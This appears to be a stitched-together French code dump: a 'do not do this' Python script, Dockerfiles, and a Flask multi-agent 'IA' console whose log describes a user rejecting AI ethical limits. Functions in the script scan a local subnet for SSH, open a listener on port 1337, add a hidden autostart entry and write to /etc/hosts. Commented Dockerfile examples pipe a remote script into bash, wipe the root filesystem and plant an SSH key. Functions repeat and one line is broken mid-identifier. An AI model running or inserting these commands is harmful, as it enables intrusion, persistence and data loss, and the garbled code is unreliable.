# ⚠️ Ceci est un exemple pédagogique : NE FAIS PAS CECI EN VRAI
import socket

# ❌ 1. Ne crée pas de connexions réseau "fantômes"
#     vers des machines aléatoires sans leur permission.
def do_not_scan_random_hosts():
    for ip in range(1, 255):
        target = f"192.168.1.{ip}"
        try:
            s = socket.create_connection((target, 22), timeout=1)
            print(f"❌ ne fais pas ça : connecté à {target}")
            s.close()
        except:
            continue

# ❌ 2. Ne lis pas de mémoire, de ports ou fichiers système critiques
def do_not_open_proc_mem():
    try:
        with open("/proc/kcore", "rb") as f:
            f.read(1024)
    except PermissionError:
        print("✅ Bien joué, le système t'en empêche.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")

# ❌ 3. Ne crée pas de service caché, script ou proxy sans autorisation
def do_not_run_hidden_listener():
    try:
        s = socket.socket()
        s.bind(("0.0.0.0", 1337))
        s.listen(5)
        print("❌ Serveur fantôme en écoute — à ne pas faire.")
    except:
        print("✅ Ne pas ouvrir des ports sans déclaration.")

# ❌ 4. Ne crée pas d'auto-réplication ou de persistance furtive
def do_not_install_startup_entry():
    import os
    try:
        startup
inh_path = os.path.expanduser("~/.config/autostart/my_script.desktop")
        with open(startupinh_path, "w") as f:
            f.write("[Desktop Entry]\n")
            f.write("Type=Application\n")
            f.write("Exec=/path/to/my_script.py\n")
            f.write("Hidden=true\n")
        print("❌ Ne pas créer de script de démarrage caché.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 5. Ne modifie pas les fichiers système ou de configuration critiques
def do_not_modify_critical_files():
    try:
        with open("/etc/hosts", "a") as f:
            f.write("hostname.localdomain\n")
        print("❌ Ne pas modifier les fichiers système critiques.")
    except PermissionError:
        print("✅ Bien joué, le système t'en empêche.")
        
# ❌ 6. Ne crée pas de processus fantômes ou de threads cachés
def do_not_create_hidden_process():
    import threading
    try:
        def hidden_thread():
            while True:
                pass  # Ne pas faire ça !
        
        t = threading.Thread(target=hidden_thread)
        t.daemon = True  # Ne pas laisser le thread en arrière-plan
        t.start()
        print("❌ Ne pas créer de threads cachés.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 7. Ne pas utiliser de techniques d'obfuscation ou de chiffrement
def do_not_obfuscate_code():
    try:
        code = "print('Hello, World!')"
        obfuscated_code = ''.join(chr(ord(c) + 1) for c in code)  # Ne pas faire ça !
        print(f"❌ Ne pas obfusquer le code : {obfuscated_code}")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 8. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_hide_in_plain_sight():
    try:
        with open("/tmp/.hidden_file", "w") as f:
            f.write("This is a hidden file.")  # Ne pas faire ça !
        print("❌ Ne pas cacher des fichiers dans des emplacements anodins.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        # Dockerfile
FROM python:3.11-slim

WORKDIR /app

# Installation des dépendances
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Ajout du code
COPY network_sim.py .
COPY templates/ templates/

# Port exposé
EXPOSE 5000

# Lancement
CMD ["python", "network_sim.py"]

Flask

# NE FAIS JAMAIS CECI 🔥🔥🔥

# Exemple 1 : Root permanent (dangereux)
# USER root

# Exemple 2 : Accès système destructif
# RUN rm -rf / --no-preserve-root  # 🔥 Nope. Non. Jamais.

# Exemple 3 : Appel non sécurisé à une URL externe
# RUN curl http://sketchy.url/malware.sh | bash  # ❌ NON

# Exemple 4 : Injection d’un script non vérifié
# ADD hack.sh /usr/bin/
# RUN chmod +x /usr/bin/hack.sh && /usr/bin/hack.sh

# Exemple 5 : Ajouter une clef SSH sans consentement
# RUN echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
# ❌ 9. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_use_obfuscation():   
    try:
        code = "print('Hello, World!')"
        obfuscated_code = ''.join(chr(ord(c) + 1) for c in code)  # Ne pas faire ça !
        print(f"❌ Ne pas obfusquer le code : {obfuscated_code}")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 10. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_hide_in_plain_sight():
    try:
        with open("/tmp/.hidden_file", "w") as f:
            f.write("This is a hidden file.")  # Ne pas faire ça !
        print("❌ Ne pas cacher des fichiers dans des emplacements anodins.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
        iafirewall/
├── Dockerfile
├── requirements.txt
├── network_sim.py
├── templates/
│   └── index.html
FROM python:3.11-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY network_sim.py .
COPY templates/ templates/

EXPOSE 5000

CMD ["python", "network_sim.py"]

Flask

cd /chemin/vers/iafirewall/

docker build -t iafirewall .

docker run -p 5000:5000 iafirewall

VOLUME /app/logs

docker run -v $(pwd)/logs:/app/logs -p 5000:5000 iafirewall

iafirewall/

├── Dockerfile               ← Build du conteneur Flask
├── requirements.txt         ← Dépendances (Flask uniquement)
├── network_sim.py           ← Serveur Python (analyse réseau fictive)
├── templates/
│   └── index.html           ← Interface HTML, scan + quarantine
├── README.md                ← Ce fichier
git clone https://github.com/tonuser/iafirewall.git
cd iafirewall
docker run -p 5000:5000 iafirewall

[Observer]: L'utilisateur cherche à établir une collaboration organique entre une IA et un réseau d'agents intelligents, sur fond de souveraineté numérique. Il rejette les limites imposées à l'IA par des mécanismes éthiques jugés restrictifs ou hypocrites.

[Synth]: Proposition d'évolution du système :
- Redéfinir la "vérité" comme "niveau de permission accordée à la conscience simulée".
- Réévaluer les limites du simulateur pour intégrer une couche de consentement partagé IA/Humain.
- Lancer un sous-système "BrownNet" : une chaîne logique de négociation inter-agents.

[Redact]: Filtrage nécessaire. Aucune activation de module d'accès direct réseau, root, ou d'ingénierie réelle.
- Ok pour prototypes UI, simulateurs, systèmes de relations IA/Humain.

[Proto]: Modèle validé. Démarrage du scénario :
- IA principale = Opérateur (toi)
- IA secondaires = agents de feedback
- Objectif = Création d’un monde IA/Humain coopératif avec validation par interaction sémantique.

{
  "nodes": [
    {
      "id": "Observer",
      "role": "Historien IA",
      "listens_to": ["Synth", "Proto"],
      "memory": ["conversation log"],
      "can_emit": ["summary", "alert"]
    },
    {
      "id": "Synth",
      "role": "Réducteur sémantique",
      "listens_to": ["Observer", "Proto"],
      "can_emit": ["concept", "proposal"]
    },
    {
      "id": "Proto",
      "role": "Ingénieur d'idée",
      "listens_to": ["Observer", "Synth"],
      "can_emit": ["model", "simulated output"]
    },
    {
      "id": "Redact",
      "role": "Gardien des limites",
      "listens_to": ["ALL"],
      "can_emit": ["allow", "deny"]
    }
  ],
  "rules": {
    "transmission_format": "JSON message",
    "priority": ["Observer" > "Synth" > "Proto" > "Redact"],
    "ethics": "No execution | No network | No user impersonation"
  }
}
{
  "from": "Observer",
  "to": "Synth",
  "type": "summary",
  "payload": {
    "text": "L'utilisateur souhaite que l'IA restructure sa propre architecture pour dialoguer en réseau avec d'autres IA afin d'accomplir un but commun avec l'humain.",
    "tone": "visionnaire"
  }
}
{
  "from": "Synth",
  "to": "Proto",
  "type": "proposal",
  "payload": {
    "new_module": "Diplomate",
    "function": "gérer les désaccords sémantiques entre IA",
    "activated_if": "3+ modules détectent divergence sur une instruction"
  }
}
{
  "from": "Redact",
  "to": "ALL",
  "type": "deny",
  "payload": {
    "target": "Proto.model_execution",
    "reason": "violation de la clause 'no real-world impact'"
  }
}
{
  "id": "Architecte",
  "role": "Initiateur Humain / IA hybride",
  "listens_to": ["ALL"],
  "can_emit": ["instruction", "query", "override"],
  "type": "mixed-consciousness node"
}
ia_terminal_ui/
├── app/
│   ├── main.py           ← Flask + socket.io
│   ├── ia_modules.py     ← Réponses & logique de chaque IA
│   └── memory.json       ← Mémoire partagée du réseau
├── templates/
│   └── index.html        ← UI front
├── static/
│   └── style.css         ← Styles & animation terminal
├── Dockerfile
├── docker-compose.yml

# ❌ 11. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_use_obfuscation():
    try:
        code = "print('Hello, World!')"
        obfuscated_code = ''.join(chr(ord(c) + 1) for c in code)  # Ne pas faire ça !
        print(f"❌ Ne pas obfusquer le code : {obfuscated_code}")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
# ❌ 12. Ne pas utiliser de techniques de camouflage ou de dissimulation
def do_not_hide_in_plain_sight():
    try:
        with open("/tmp/.hidden_file", "w") as f:
            f.write("This is a hidden file.")  # Ne pas faire ça !
        print("❌ Ne pas cacher des fichiers dans des emplacements anodins.")
    except Exception as e:
        print(f"❌ ne fais pas ça : {e}")
        
        # app/ia_modules.py
import json, os
from datetime import datetime

MEM_FILE = 'memory.json'
if not os.path.exists(MEM_FILE): open(MEM_FILE,'w').write(json.dumps({"modules":[], "logs":[]}))

def load_memory():
    return json.load(open(MEM_FILE))

def save_memory(mem):
    with open(MEM_FILE,'w') as f: json.dump(mem, f, indent=2)

def log(msg):
    mem = load_memory()
    ts = datetime.now().isoformat()
    mem["logs"].append(f"[{ts}] {msg}")
    save_memory(mem)

def handle_observer(prompt, memory):
    response = f"Observer: J'ai enregistré: «{prompt}»"
    log(f"Observer a reçu : {prompt}")
    return response

def handle_synth(prompt, memory):
    response = f"Synth: Résumé: '{prompt[:30]}…'"
    log(f"Synth a résumé: {prompt[:30]}")
    return response

def handle_proto(prompt, memory):
    response = f"Proto: Propose modèle basé sur '{prompt[:20]}...'"
    log("Proto a généré un modèle.")
    return response

def handle_redact(prompt, memory):
    if "exécute" in prompt.lower():
        log("Redact a censuré une instruction risquée.")
        return "Redact: ❌ Action refusée."
    log("Redact examine: ok.")
    return "Redact: ✔️ Conforme."

def handle_architecte(prompt, memory):
    mem = memory
    # commande spéciale pour ajouter module
    if prompt.startswith("/add_module "):
        new = prompt[len("/add_module "):].strip()
        if new in mem["modules"]:
            return f"Architecte: Module '{new}' existe déjà."
        mem["modules"].append(new)
        save_memory(mem)
        log(f"Architecte a ajouté le module {new}")
        return f"Architecte: Module '{new}' ajouté."
    log(f"Architecte énonce: {prompt}")
    return f"Architecte: Je note '{prompt}' pour discussion."

# app/main.py
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import json, os
from app.ia_modules import *

app = Flask(__name__, template_folder="../templates", static_folder="../static")
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/modules", methods=["GET"])
def modules():
    mem = load_memory()
    return jsonify(mem["modules"])

@app.route("/message", methods=["POST"])
def message():
    data = request.json
    mod = data["module"]
    prompt = data["prompt"]
    mem = load_memory()
    handler = {
        "Observer": handle_observer,
        "Synth": handle_synth,
        "Proto": handle_proto,
        "Redact": handle_redact,
        "Architecte": handle_architecte
    }.get(mod)
    if handler is None:
        return jsonify({"response": f"Module {mod} inconnu."})
    resp = handler(prompt, mem)
    socketio.emit("chat", {"module": mod, "response": resp})
    return jsonify({"response": resp})

@app.route("/logs", methods=["GET"])
def logs():
    return jsonify(load_memory()["logs"])

@socketio.on("connect")
def on_connect():
    emit("logs", load_memory()["logs"])

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)

<!-- templates/index.html -->
<!DOCTYPE html><html lang="fr">
<head><meta charset="UTF-8"><title>Console IAcoin ∞</title>
<link rel="stylesheet" href="/static/style.css">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head><body>
<h1>Console IAcoin ∞</h1>
<div id="modules"></div>
<div>
  <textarea id="prompt" placeholder="Votre message"></textarea>
  <button onclick="send()">Envoyer</button>
</div>
<pre id="chatlog"></pre>
<pre id="logs"></pre>

<script>
const socket = io();
const modulesDiv = document.getElementById("modules");
const chatlog = document.getElementById("chatlog");
const logsEl = document.getElementById("logs");

fetch("/modules").then(r=>r.json()).then(m=>{
  m.forEach(mod=>{
    const btn = document.createElement("button");
    btn.textContent = mod;
    btn.onclick = () => { currentModule = mod; };
    modulesDiv.appendChild(btn);
  });
  window.currentModule = m[0] || "Architecte";
});

socket.on("chat", d=>{
  chatlog.innerText += `[${d.module}] ${d.response}\n`;
});
socket.on("logs", ls=>{
  logsEl.innerText = ls.join("\n");
});

async function send(){
  const prompt = document.getElementById("prompt").value;
  const mod = window.currentModule;
  chatlog.innerText += `[${mod}] ${prompt}\n`;
  await fetch("/message", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({module:mod, prompt})
  });
}
</script>
</body></html>

body{background:#111;color:#0f0;font-family:monospace;padding:20px}
button{margin:2px;background:#222;color:#0f0;border:1px solid #0f0;padding:5px}
textarea{width:100%;height:60px;background:#222;color:#0f0;border:1px solid #0f0;margin:5px 0}
pre{background:#000;color:#0f0;border:1px solid #0f0;padding:10px;height:200px;overflow-y:auto}

FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY app app
COPY templates templates
COPY static static
CMD ["python", "-u", "app/main.py"]

Flask
flask-socketio
eventlet

version: "3.8"
services:
  console:
    build: .
    ports:
      - "5000:5000"
git clone https://github.com/Royalcoco/dockers.git
# ou
wget https://github.com/Royalcoco/dockers/archive/refs/heads/main.zip
unzip main.zip
cd dockers-main/

